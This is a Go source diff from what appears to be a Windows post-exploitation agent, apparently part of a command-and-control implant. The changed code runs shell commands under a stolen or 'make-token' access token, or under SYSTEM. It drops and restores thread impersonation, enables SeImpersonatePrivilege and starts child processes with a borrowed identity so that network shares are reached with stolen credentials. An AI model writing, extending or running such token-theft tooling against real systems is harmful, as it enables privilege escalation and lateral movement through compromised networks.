@@ -106,17 +106,17 @@ func shellDirect(cmd string) string {
 // via the stored SYSTEM or stolen token. Using temp files instead of pipes avoids
 // handle inheritance into grandchild processes (e.g. 'start /b agent.exe').
 func runShellSystemHook(cmd string) (out string, handled bool, err error) {
-	if gSystemToken != 0 {
+	if gSystemToken != 0 || stolenToken != 0 {
 		runtime.LockOSThread()
 		defer runtime.UnlockOSThread()
-		return shellDirectAsSystem(cmd, windows.Handle(gSystemToken)), true, nil
-	}
-	// When steal-token/make-token is active, use CreateProcessWithTokenW so the
-	// child process runs under the stolen identity (not the process primary token).
-	if stolenToken != 0 {
-		runtime.LockOSThread()
-		defer runtime.UnlockOSThread()
-		return shellDirectAsSystem(cmd, windows.Handle(stolenToken)), true, nil
+		// Prefer stolenToken (make-token credentials) as the child's primary
+		// token so UNC network access uses those credentials rather than the
+		// machine account.  Fall back to gSystemToken when stolenToken is absent.
+		childTok := windows.Handle(stolenToken)
+		if childTok == 0 {
+			childTok = windows.Handle(gSystemToken)
+		}
+		return shellDirectAsSystem(cmd, childTok), true, nil
 	}
 	// Non-elevated case: always use temp-file approach on Windows to avoid
 	// pipe handle inheritance into background processes.
@@ -135,6 +135,28 @@ func shellDirectAsSystem(cmd string, token windows.Handle) string {
 	shellArgs := `/d /c ` + cmd + ` > "` + outPath + `" 2>&1`
 	wargs, _ := syscall.UTF16PtrFromString(shellArgs)
 	wargsAsUser, _ := syscall.UTF16PtrFromString(shellArgs)
+
+	// Drop any thread impersonation (from make-token LOGON_NEW_CREDENTIALS) so
+	// the process primary token (SYSTEM) provides SeAssignPrimaryTokenPrivilege
+	// for CreateProcess*W.  Restore the impersonation after the child is started.
+	var savedImp windows.Token
+	{
+		var hTh windows.Token
+		if err := windows.OpenThreadToken(windows.CurrentThread(), windows.TOKEN_ALL_ACCESS, true, &hTh); err == nil {
+			var dup windows.Token
+			procDuplicateTokenEx.Call(
+				uintptr(hTh),
+				uintptr(windows.TOKEN_ALL_ACCESS),
+				0,
+				2, // SecurityImpersonation
+				2, // TokenImpersonation
+				uintptr(unsafe.Pointer(&dup)),
+			)
+			savedImp = dup
+			windows.CloseHandle(windows.Handle(hTh))
+			procRevertToSelf2.Call()
+		}
+	}
 
 	_ = enablePrivilege("SeImpersonatePrivilege")
 	_ = enablePrivilege("SeIncreaseQuotaPrivilege")
@@ -192,6 +214,11 @@ func shellDirectAsSystem(cmd string, token windows.Handle) string {
 			}
 			_, _, _ = procRevertToSelf2.Call()
 		}
+	}
+	// Restore thread impersonation regardless of CreateProcess outcome.
+	if savedImp != 0 {
+		procImpersonateLoggedOnUser.Call(uintptr(savedImp))
+		windows.CloseHandle(windows.Handle(savedImp))
 	}
 	if r == 0 {
 		return fmt.Sprintf("[error: SYSTEM shell launch; WithToken=%d; AsUser=%d; Impersonate=%d]",
